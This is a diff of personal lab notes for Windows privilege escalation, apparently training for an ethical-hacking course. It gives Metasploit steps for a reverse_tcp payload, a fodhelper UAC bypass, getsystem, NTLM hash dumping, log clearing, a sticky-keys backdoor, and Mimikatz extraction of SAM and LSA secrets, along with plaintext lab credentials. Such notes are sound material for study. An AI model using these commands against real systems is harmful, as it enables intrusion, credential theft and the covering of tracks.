@@ -90,21 +90,23 @@ nc -nc 10.10.1.11 9999 (connect vulnserver.exe to parrot machine netcat listner)
 6. Open browser(firefox)  >> search for "http://10.10.1.13/share" >> download and run exploit.exe
 >>> Parrot Machine [Attacker/10.10.1.13]
 7.  sessions -i 1  >> getuid >> sysinfo >> run vnc   (Meterpreter session 1 opened)
-8. Places(top menu on the desktop)  >>  Network >>   press Ctrl+L  >> smb://10.10.1.11  >> Credentials(Admin,Pa$$w0rd)10.
-9. upload /home/attacker/Desktop/BeRoot/beRoot.exe       [In Terminal(meterpreter)]
-10. shell  (to open a shell session)    >>  dir  >>  beroot.exe  (beroot start his work and show you the result in terminal and you can use that information to find vulnerability in targat system.)
-11. upload /home/attacker/Desktop/BeRoot/Seatbelt.exe
-12. shell >> dir >> Seatbelt.exe -group=system(gather information about AMSIProviders, AntiVirus, AppLocker etc)  >>  Seatbelt.exe -group=user (gather information about ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum, dir, DpapiMasterKeys etc) >> Seatbelt.exe -group=misc (gather information about ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo etc)
-13. exit (to go outside the shell)
-14. background (in meterpreter)
-15. use exploit/windows/local/bypassuac_fodhelper (use exploit to bybassuac)    >>  show option >> set session 1
-16. set payload/windows/meterpreter/reverse_tcp >> show options >> set lhost, lport >> set target 0 >> exploit   (Meterpreter session 2 opened)
-17. getsystem -t 1  [using named pipe impersonation technique for escalating privileges]
-18. getuid >> sysinfo >> run post/windows/gather/smart_hashdump (extracts the NTLM hashes)  >> clearev(clearing logs)
+8. upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1(PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.)
+9. shell(to get shell access) >>  powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks” (to run the PowerUp.ps1 file)
+10. Places(top menu on the desktop)  >>  Network >>   press Ctrl+L  >> smb://10.10.1.11  >> Credentials(Admin,Pa$$w0rd)10.
+11. upload /home/attacker/Desktop/BeRoot/beRoot.exe       [In Terminal(meterpreter)]
+13. shell  (to open a shell session)    >>  dir  >>  beroot.exe  (beroot start his work and show you the result in terminal and you can use that information to find vulnerability in targat system.)
+14. upload /home/attacker/Desktop/BeRoot/Seatbelt.exe
+15. shell >> dir >> Seatbelt.exe -group=system(gather information about AMSIProviders, AntiVirus, AppLocker etc)  >>  Seatbelt.exe -group=user (gather information about ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum, dir, DpapiMasterKeys etc) >> Seatbelt.exe -group=misc (gather information about ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo etc)
+16. exit (to go back to meterpreter and close shell)
+17. background (type in meterpreter session to run current session in background and use msf for run new exploits,payload,post,etc)
+18. use exploit/windows/local/bypassuac_fodhelper (use exploit to bypassuac)    >>  show option >> set session 1
+19. set payload/windows/meterpreter/reverse_tcp >> show options >> set lhost, lport >> set target 0 >> exploit   (Meterpreter session 2 opened)
+20. getsystem -t 1  [using named pipe impersonation technique for escalating privileges]
+21. getuid >> sysinfo   >>     run post/windows/gather/smart_hashdump (extracts the NTLM hashes)    >>    clearev (clearing logs)
 # Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys 
-19. background  >>  use post/windows/manage/sticky_keys >> sessions i*  >>  set session 2(privileged session)  >> exploit 
+22. background  >>  use post/windows/manage/sticky_keys >> sessions i*  >>  set session 2(privileged session)  >> exploit 
 # Escalate Privileges to Gather Hashdump using Mimikatz
-20. load kiwi >>  help kiwi  >>  
+23. load kiwi >>  help kiwi  >>  
     >> lsa_dump_sam (to load NTLM Hash of all users.)
     >> lsa_dump_secrets (LSA secrets are used to manage a system's local security policy, and contain sensitive data such as User passwords, IE passwords, service account passwords, SQL passwords etc.)
     >> "password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password" (change the password of Admin using the password_change module)
